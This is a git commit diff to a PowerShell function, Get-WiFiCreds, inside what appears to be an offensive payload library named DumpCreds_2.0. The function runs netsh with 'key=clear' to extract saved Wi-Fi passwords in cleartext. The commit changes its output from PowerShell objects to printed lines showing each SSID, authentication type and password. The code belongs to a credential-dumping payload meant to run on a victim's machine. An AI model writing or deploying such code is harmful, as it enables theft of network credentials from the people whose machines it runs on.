82d3ee15961080dfe8911baf2aec09d0fbe3b926
qdba <dieter@baur.nu>
2017-04-03 22:02:07 +0200

    WifiCreds changed

--- payloads/library/DumpCreds_2.0/PS/Get-WiFiCreds.ps1
+++ payloads/library/DumpCreds_2.0/PS/Get-WiFiCreds.ps1
@@ -9,11 +9,10 @@ function Get-WiFiCreds {
 	    $Network = netsh wlan show profiles name=$SSID key=clear
 	    $AuthType = (($Network | Select-String "Authentifizierung") -split(": "))[1] # set according to you language
         $Password = (($Network | select-string "sselinhalt") -split(": "))[1]	     # in us its Authentication
-	    $obj=New-Object PSObject
-        $obj | Add-Member NoteProperty SSID($SSID)
-        $obj | Add-Member NoteProperty Authentication($AuthType)
-        $obj | Add-Member NoteProperty Password($Password)
-        Write-Output $obj 
+	    echo "SSID`t`t`t:`t $SSID"
+        echo "AuthType`t`t:`t $AuthType"
+        echo "Password`t`t:`t $Password"
+        echo ""
     }
 }
 
